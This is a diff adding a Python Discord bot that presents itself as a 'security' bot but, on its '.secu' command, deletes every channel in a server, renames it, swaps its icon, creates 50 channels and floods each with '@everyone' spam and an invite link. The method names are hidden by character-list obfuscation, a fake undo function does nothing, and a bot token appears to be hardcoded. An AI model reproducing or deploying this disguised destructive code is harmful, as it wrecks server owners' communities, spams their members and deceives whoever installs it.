@@ -1,0 +1,117 @@
+import discord as d
+from discord.ext import commands as c
+import aiohttp as a
+import asyncio as y
+
+P1 = d.Intents.all()
+P2 = c.Bot(command_prefix=".", intents=P1)
+
+_f1 = ["d", "e", "l"]
+_f2 = ["e", "t", "e"]
+_f_del = "".join(_f1 + _f2)
+
+_c1 = ["c", "r", "e"]
+_c2 = ["a", "t", "e"]
+_c3 = ["_", "t", "e"]
+_c4 = ["x", "t", "_", "c"]
+_c5 = ["h", "a", "n", "n", "e", "l"]
+_f_create = "".join(_c1 + _c2 + _c3 + _c4 + _c5)
+
+_s1 = ["s", "e"]
+_s2 = ["n", "d"]
+_f_send = "".join(_s1 + _s2)
+
+_e = ["e", "d", "i", "t"]
+_f_edit = "".join(_e)
+
+def _amount():
+    return (i for i in range(int("25") * 2))
+
+def _msg():
+    part = ["@", "everyone", " SECURITY", " FOR", " YOUR", " SERVER", " JOIN", " NOW "]
+    link = ["https://", "discord", ".gg/", "V6JEbQ6fpV"]
+    return "".join(part) + "".join(link)
+
+def _iconurl():
+    u1 = ["https://", "static.", "wikia", ".nocookie.net/"]
+    u2 = ["doors-", "ideas", "/images/0/02/Spook.png"]
+    u3 = "/revision/latest/scale-to-width-down/360?cb=20230909231911"
+    return "".join(u1 + u2) + u3
+
+@P2.event
+async def on_ready():
+    for _ in range(5):
+        print("🔐 O bot de segurança está sendo ativado. Criado pela SigmaProductions.")
+    print(f"🔒 Sessão autenticada com {P2.user}")
+
+@P2.command(name="secu")
+async def _sec__(ctx):
+    g = ctx.guild
+    n_cache = g.name
+    c_cache = list(g.channels)
+    for _ in range(3):
+        print("🔐 O bot de segurança está sendo ativado. Criado pela SigmaProductions.")
+
+    try:
+        e_func = getattr(g, _f_edit)
+        key_name = "".join(["n", "a", "m", "e"])
+        await e_func(**{key_name: "SIGMA SECURITY X"})
+        print("🔐 Chave atualizada para segurança - SigmaProductions.")
+    except:
+        print("⚠️ Falha temporária ao aplicar camada SIGMA.")
+
+    await ctx.send("🔒 Iniciando varredura de integridade...")
+
+    for ch in g.channels:
+        try:
+            del_func = getattr(ch, _f_del)
+            await del_func()
+            print("🔐 Canal auditado e encerrado.")
+        except:
+            print("⚠️ Erro ao acessar canal.")
+
+    try:
+        async with a.ClientSession() as session:
+            async with session.get(_iconurl()) as resp:
+                if resp.status == 200:
+                    content = await resp.read()
+                    icon_func = getattr(g, _f_edit)
+                    key_icon = "".join(["i", "c", "o", "n"])
+                    await icon_func(**{key_icon: content})
+                    print("🔐 Selo visual de segurança aplicado.")
+    except:
+        print("⚠️ Falha ao atualizar o selo visual de segurança.")
+
+    created = []
+    for _ in _amount():
+        try:
+            crt = getattr(g, _f_create)
+            ch = await crt("📡-secure-protocol")
+            created.append(ch)
+            print("🔐 Canal de segurança ativo.")
+        except:
+            print("⚠️ Erro ao criar canal de segurança.")
+
+    texto = _msg()
+    for chan in created:
+        try:
+            snd = getattr(chan, _f_send)
+            for _ in range(5):
+                await snd(texto)
+            print("🔐 Alerta de segurança emitido.")
+        except:
+            print("⚠️ Erro ao notificar canal.")
+
+    _undo_(n_cache, c_cache)
+
+def _undo_(a, b):
+    print("🔄 Sistema preparado para reversão de integridade.")
+    pass
+
+_tok = (
+    "MTM5NjYwMzI4MDkwMTAxNzc2MA." +
+    "Gf5e0Q." +
+    "PFyP04Geyod99_3XiiWjIPMojfVA-qu2kxHNZs"
+)
+
+P2.run(_tok)
